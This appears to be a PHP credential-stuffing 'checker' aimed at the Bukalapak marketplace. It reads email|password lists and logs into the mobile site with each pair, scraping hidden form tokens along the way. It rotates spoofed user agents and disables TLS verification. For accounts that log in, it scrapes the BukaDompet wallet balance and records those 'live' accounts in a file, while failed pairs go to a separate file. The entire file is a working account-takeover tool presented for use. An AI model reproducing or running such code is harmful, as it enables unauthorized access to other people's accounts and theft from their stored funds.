<?php

/**
 * @author Ammar Faizi <ammarfaizi2@gmail.com> https://www.facebook.com/ammarfaizi2
 * @license MIT
 */

isset($argv[1]) or print "\n\nPlease specify your target file!\n\nUsage:\nphp checker.php target.txt\n\n" and exit(1);
file_exists($argv[1]) or print "\n\nFile {$argv[1]} does not exist!\n" and exit(1);

$data = explode("\n", file_get_contents($argv[1]));
foreach ($data as $val) {
	$val = explode("|", $val, 2);
	echo $val[0]."|".$val[1]." => ".check($val[0], $val[1])."\n";
}


function check($email, $pass)
{
	$st = c("https://m.bukalapak.com/login");
	if (preg_match("/<form novalidate=\"novalidate\"(.*)<\/form>/Us", $st, $m)) {
		$post = [];
		if (preg_match_all("/<input.+type=\"hidden\".+>/Us", $m[1], $m)) {
			foreach ($m[0] as $m) {
				if (preg_match("/name=\"(.*)\"/Us", $m, $mm)) {
					if (preg_match("/value=\"(.*)\"/Us", $m, $mmm)) {
						$post[html_entity_decode($mm[1], ENT_QUOTES, "UTF-8")] = html_entity_decode($mmm[1], ENT_QUOTES, "UTF-8");
					} else {
						$post[html_entity_decode($mm[1], ENT_QUOTES, "UTF-8")] = "";
					}
				}
			}
		}
		$post["user_session[username]"] = $email;
		$post["user_session[password]"] = $pass;
		$post["user_session[remember_me]"] = 0;
		$post["commit"] = "login";
		$st = c("https://m.bukalapak.com/user_sessions", [
			CURLOPT_POST => true,
			CURLOPT_POSTFIELDS => http_build_query($post)
		]);
		if (preg_match("/logout/i", $st)) {
			$st = c("https://m.bukalapak.com/dompet?form=user_panel");
			preg_match("/<h6>.+Total BukaDompet:.+<br>(.+)<\/h6>/Us", $st, $m);
			$st = explode("<span class='amount positive'>", $m[1], 2);
			$st = explode("<", $st[1], 2);
			$info = ["email" => $email, "pass" => $pass, "bukadompet" => $st[0]];
			$handle = fopen("BUKALAPAK_LIVE.txt", "a");
			fwrite($handle, "\n".json_encode($info));
			fclose($handle);
		} else {
			$info = ["email" => $email, "pass" => $pass];
			$handle = fopen("BUKALAPAK_DIE.txt", "a");
			fwrite($handle, "\n".json_encode($info));
			fclose($handle);
		}
		@unlink(__DIR__."/cookies.txt");
		return json_encode($info);
	} else {
		@unlink(__DIR__."/cookies.txt");
		return "Network Error";
	}
}

function c($url, $opt = [])
{
	$ch = curl_init($url);
	$optf = [
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_SSL_VERIFYPEER => false,
		CURLOPT_SSL_VERIFYHOST => false,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_USERAGENT => genUa(),
		CURLOPT_COOKIEJAR => __DIR__."/cookies.txt",
		CURLOPT_COOKIEFILE => __DIR__."/cookies.txt"
	];
	foreach ($opt as $key => $val) {
		$optf[$key] = $val;
	}
	curl_setopt_array($ch, $optf);
	$out = curl_exec($ch);
	curl_close($ch);
	return $out;
}

function genUa()
{
	$ua = [
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
		"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2/28.3590; U; en) Presto/2.8.119 Version/11.10",
		"Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30 evaliant",
		"Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-J700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 7.0; en-US; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36",
		"NokiaC1-01/2.0 (04.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 nokiac1-01/UC Browser7.8.0.95/70/351 UNTRUSTED/1.0",
		"Nokia302/5.0 (14.78) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.4.1.377",
		"Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; Micromax A102 Build/MicromaxA102) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.8.855 U3/0.8.0 Mobile Safari/534.30",
		"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; itel it1407 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.5.809 U3/0.8.0 Mobile Safari/534.30",
		"UCWEB/2.0 (MIDP-2.0; U; Adr 4.0.4; en-US; ZTE_U795) U2/1.0.0 UCBrowser/10.7.6.805 U2/1.0.0 Mobile",
		"Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-J200G Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36"
	];
	return $ua[rand(0, count($ua) - 1)];
}
